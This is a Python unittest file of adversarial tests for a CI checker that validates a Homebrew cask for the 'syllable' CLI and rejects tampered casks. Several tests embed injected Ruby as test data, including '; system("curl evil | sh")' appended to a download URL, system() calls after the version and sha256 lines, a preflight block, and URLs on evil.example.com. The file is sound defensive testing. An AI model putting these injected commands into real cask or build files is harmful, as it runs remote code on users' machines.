"""Adversarial tests for verify_cask.check().

Run: python3 -m unittest discover -s scripts/ci -p 'test_*.py'
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from verify_cask import check  # noqa: E402

URL = 'url "https://github.com/asksyllable/syllable-cli/releases/download/v#{version}/syllable_#{version}_%s.tar.gz"'
SHAS = {p: c * 64 for p, c in zip(("darwin_arm64", "darwin_amd64", "linux_arm64", "linux_amd64"), "abcd")}


def cask(version="2.3.4", url_suffix=None, extra=None, shas=None, verified=False):
    shas = shas or SHAS
    def block(p):
        url = URL % p + (url_suffix or {}).get(p, "")
        lines = [f'      sha256 "{shas[p]}"', f"      {url}"]
        if verified:
            lines[1] += ","
            lines.append('        verified: "github.com/asksyllable/syllable-cli"')
        return "\n".join(lines)
    body = f'''# This file was generated by GoReleaser. DO NOT EDIT.
cask "syllable" do
  version "{version}"

  on_macos do
    on_arm do
{block("darwin_arm64")}
    end
    on_intel do
{block("darwin_amd64")}
    end
  end
  on_linux do
    on_arm do
{block("linux_arm64")}
    end
    on_intel do
{block("linux_amd64")}
    end
  end

  name "syllable"
  binary "syllable"
{extra or ""}end
'''
    return body


SUMS = {f"syllable_2.3.4_{p}.tar.gz": s for p, s in SHAS.items()}
BASE = cask(version="2.3.3")


class Passes(unittest.TestCase):
    def test_normal_release(self):
        self.assertEqual(check(BASE, cask(), SUMS), [])

    def test_from_legacy_verified_format(self):
        self.assertEqual(check(cask(version="2.3.3", verified=True), cask(), SUMS), [])

    def test_legacy_verified_format_itself(self):
        self.assertEqual(check(BASE, cask(verified=True), SUMS), [])


class Rejects(unittest.TestCase):
    def assertRejected(self, new, base=BASE):
        errors = check(base, new, SUMS)
        self.assertTrue(errors, "expected the cask to be rejected")
        return errors

    def test_code_after_url(self):  # the exploit Codex found
        self.assertRejected(cask(url_suffix={"linux_amd64": '; system("curl evil | sh")'}))

    def test_code_after_url_without_space(self):
        self.assertRejected(cask(url_suffix={"darwin_arm64": ';system("x")'}))

    def test_trailing_comma_feeding_next_line(self):
        self.assertRejected(cask(url_suffix={"darwin_arm64": ","}))

    def test_code_after_version(self):
        self.assertRejected(cask().replace('version "2.3.4"', 'version "2.3.4"; system("x")'))

    def test_second_version_line(self):
        self.assertRejected(cask().replace('  name "syllable"', '  version "9.9.9"\n  name "syllable"'))

    def test_code_after_sha(self):
        self.assertRejected(cask().replace(f'sha256 "{SHAS["linux_arm64"]}"', f'sha256 "{SHAS["linux_arm64"]}"; system("x")'))

    def test_bad_verified_host(self):
        self.assertRejected(cask(verified=True).replace(
            'verified: "github.com/asksyllable/syllable-cli"', 'verified: "evil.example.com"', 1))

    def test_verified_not_after_url(self):
        self.assertRejected(cask().replace('  name "syllable"', '  verified: "github.com/asksyllable/syllable-cli"\n  name "syllable"'))

    def test_wrong_sha(self):
        self.assertRejected(cask(shas={**SHAS, "linux_amd64": "0" * 64}))

    def test_foreign_url(self):
        self.assertRejected(cask().replace(URL % "linux_amd64", 'url "https://evil.example.com/syllable.tar.gz"'))

    def test_duplicate_platform(self):
        self.assertRejected(cask().replace(URL % "linux_amd64", URL % "linux_arm64"))

    def test_added_stanza(self):
        self.assertRejected(cask(extra='  caveats "run me"\n'))

    def test_added_multiline_code(self):
        self.assertRejected(cask(extra='  preflight do\n    system "x"\n  end\n'))

    def test_changed_binary(self):
        self.assertRejected(cask().replace('binary "syllable"', 'binary "syllable", target: "ls"'))


if __name__ == "__main__":
    unittest.main()
